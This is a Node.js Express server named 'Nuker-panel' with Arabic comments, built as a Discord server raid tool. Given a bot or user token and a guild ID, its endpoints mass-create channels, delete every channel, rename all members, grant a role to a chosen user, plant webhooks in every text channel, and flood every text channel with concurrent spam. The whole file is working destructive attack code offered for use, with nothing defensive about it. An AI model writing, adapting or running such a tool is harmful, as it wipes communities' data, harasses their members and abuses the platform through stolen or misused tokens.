// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_API = 'https://discord.com/api/v10';

function getHeaders(token, isBot = true) {
    return {
        'Authorization': isBot ? `Bot ${token}` : token,
        'Content-Type': 'application/json'
    };
}

// إنشاء رومات جماعية
app.post('/api/channels/create', async (req, res) => {
    const { token, guildId, name, count, isBot } = req.body;
    try {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(
                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
                    name: `${name}-${i}`,
                    type: 0
                }, { headers: getHeaders(token, isBot) })
            );
        }
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker-panel] Channels created successfully under GRoUpKh6r rights.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// حذف جميع الرومات
app.post('/api/channels/delete', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const promises = channelsRes.data.map(ch => 
            axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: getHeaders(token, isBot) })
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker-panel] All channels wiped successfully.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// تغيير ألقاب جميع الأعضاء
app.post('/api/members/nicknames', async (req, res) => {
    const { token, guildId, newNickname, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
                nick: newNickname
            }, { headers: getHeaders(token, isBot) }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker-panel] All member nicknames updated.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// منح رتبة / صلاحيات المجموعة
app.post('/api/roles/assign', async (req, res) => {
    const { token, guildId, targetUserId, roleId, isBot } = req.body;
    try {
        await axios.put(`${DISCORD_API}/guilds/${guildId}/members/${targetUserId}/roles/${roleId}`, {}, {
            headers: getHeaders(token, isBot)
        });
        res.json({ success: true, message: '[Nuker-panel] GRoUpKh6r rank/role assigned successfully.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// زرع Webhooks جماعي
app.post('/api/webhooks', async (req, res) => {
    const { token, guildId, webhookName, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        const promises = textChannels.map(ch => 
            axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, {
                name: webhookName
            }, { headers: getHeaders(token, isBot) })
        );
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker-panel] Webhooks deployed to all rooms.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// السبام المتزامن الخارق
app.post('/api/spam', async (req, res) => {
    const { token, guildId, message, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        const promises = [];
        for (let i = 0; i < 5; i++) {
            textChannels.forEach(ch => {
                promises.push(
                    axios.post(`${DISCORD_API}/channels/${ch.id}/messages`, {
                        content: message
                    }, { headers: getHeaders(token, isBot) }).catch(() => {})
                );
            });
        }
        await Promise.all(promises);
        res.json({ success: true, message: '[Nuker-panel] High-speed concurrent spam executed.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Nuker-panel running on port ${PORT}`));
